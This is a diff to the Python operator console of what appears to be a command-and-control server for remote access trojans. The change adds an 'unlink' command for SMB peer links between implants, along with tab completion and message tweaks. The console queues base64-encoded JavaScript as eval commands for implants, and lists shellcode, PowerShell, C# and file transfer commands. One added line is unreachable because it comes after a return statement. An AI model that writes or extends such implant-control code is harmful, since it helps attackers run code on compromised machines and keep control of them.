@@ -66,7 +66,7 @@ links = {}
 # Tab completion stuff -- https://stackoverflow.com/questions/5637124/tab-completion-in-pythons-raw-input
 class Completer(object):
     def __init__(self):
-        self.tab_cmds = ['all', 'rats', 'download', 'upload', 'psh', 'csharp', 'spawn', 'quit', 'back', 'exit', 'help', 'remove', 'clear', 'stagers', "shellcode", "eval", "note", "set-msbuild-path", "link", "exec"]
+        self.tab_cmds = ['all', 'rats', 'download', 'upload', 'psh', 'csharp', 'spawn', 'quit', 'back', 'exit', 'help', 'remove', 'clear', 'stagers', "shellcode", "eval", "note", "set-msbuild-path", "link", "unlink", "exec"]
         self.re_space = re.compile('.*\s+$', re.M)
 
     def add_tab_item(self, item):
@@ -114,6 +114,18 @@ class Completer(object):
             res[0] += ' '
             return res
 
+    def _complete_unlink(self, link=None):
+        if not link:
+            return list(links[ratID]) + ["all"]
+        res = [l for l in (list(links[ratID]) + ["all"]) if l.startswith(link)]
+        # Partial match
+        if(len(res) > 1):
+            return res
+        # Exact match
+        if(len(res) == 1):
+            res[0] += ' '
+            return res
+
     # Register all these completable commands as having special arguments
     # Completable path argments except 'remove' and 'note' which autocompletes to the ratID
     def complete_upload(self, args):
@@ -136,6 +148,9 @@ class Completer(object):
 
     def complete_note(self, args):
         return self._complete_rat(args[0])
+
+    def complete_unlink(self, args):
+        return self._complete_unlink(args[0])
 
     def complete(self, text, state):
         "Generic readline completion entry point."
@@ -323,6 +338,22 @@ def link_smb(ratID, filepath): # returns eval data for rat and registers link di
 
     pretty_print("[*] Linking " + colors(ratID) + " to peer rat over SMB file path: " + filepath)
     return "ev " + base64.b64encode(run_extra_data.encode('utf-8')).decode('utf-8')
+
+def unlink_smb(ratID, filepath):
+    if filepath == "all":
+        return "ev " + encode_file(os.getcwd() + "/resources/smb_unlink_all.js")
+        links[ratID] = ["None"]
+    
+    with open(os.getcwd() + "/resources/smb_unlink.js", "r") as fd:
+        smb_unlink_data = fd.read()
+    smb_unlink_data = smb_unlink_data.replace("~~FILEPATH~~", filepath.replace("\\", "\\\\\\\\")) # replace \ with \\\\ since we also account for meta-programming
+
+    if(filepath in links[ratID]):
+        links[ratID].remove(filepath)
+        if(not links[ratID]):
+            links[ratID] = ["None"]
+    
+    return "ev " + base64.b64encode(smb_unlink_data.encode('utf-8')).decode('utf-8')
 
 def encode_file(filepath):
     with open(Path(filepath).resolve() , "rb") as fd:
@@ -762,7 +793,7 @@ if __name__ == "__main__":
 
             elif(inp == "clear"):
                 commands = commands.fromkeys(commands, "")
-                pretty_print("Cleared all rat command queues!")
+                pretty_print("[*] Cleared all rat command queues!")
 
             # Enter rat specific command prompt
             elif(inp in rats.keys() or inp == "all"):
@@ -786,7 +817,7 @@ if __name__ == "__main__":
 
                         elif(inp == "clear"):
                             commands = commands.fromkeys(commands, "")
-                            pretty_print("Cleared all rat command queues!")
+                            pretty_print("[*] Cleared all rat command queues!")
                             continue
 
                         elif(inp == "help"):
@@ -871,6 +902,13 @@ if __name__ == "__main__":
                         elif(str.startswith(inp, "link ")):
                             filepath = inp.split(" ")[1]
                             inp = link_smb(ratID, filepath)
+
+                        elif(str.startswith(inp, "unlink ")):
+                            filepath = inp.split(" ")[1]
+                            if(filepath == "None"):
+                                pretty_print("[!] You can't unlink \"None\" (that doesn't even make sense)") # horrible
+                                continue
+                            inp = unlink_smb(ratID, filepath)
 
                         elif(str.startswith(inp, "cs ") or str.startswith(inp, "csharp ")):
                             try:
